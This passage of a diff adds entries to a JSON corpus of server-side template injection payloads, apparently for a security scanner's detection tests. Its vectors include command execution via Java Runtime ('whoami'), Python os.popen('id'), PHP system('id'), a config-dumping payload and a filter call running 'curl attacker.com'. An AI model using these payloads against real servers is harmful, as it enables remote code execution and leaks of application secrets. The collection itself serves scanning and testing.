+      "vector": "#set($s='')#set($stringClass=$s.getClass())#set($runtime=$stringClass.forName('java.lang.Runtime').getRuntime())#set($process=$runtime.exec('whoami'))#set($null=$process.waitFor())#foreach($i in [1..$process.getInputStream().available()])$i#end",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "ssti.legacy.f350f3ebcd",
+      "vector": "a{*comment*}b",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.f39a6b9375",
+      "vector": "{{[].__class__.__base__.__subclasses__()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.f3d42eb915",
+      "vector": "{{global}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.f4461ad03e",
+      "vector": "{{url_for.__globals__['current_app'].config}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.fb34f63b06",
+      "vector": "{{app.request.query.filter(0,'curl attacker.com',1024,{'options':'system'})}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.fca9be4d4d",
+      "vector": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.fd007ff8fb",
+      "vector": "test{{7*7}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.fffcdcf938",
+      "vector": "${@print(system('id'))}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    }
+  ]
+}
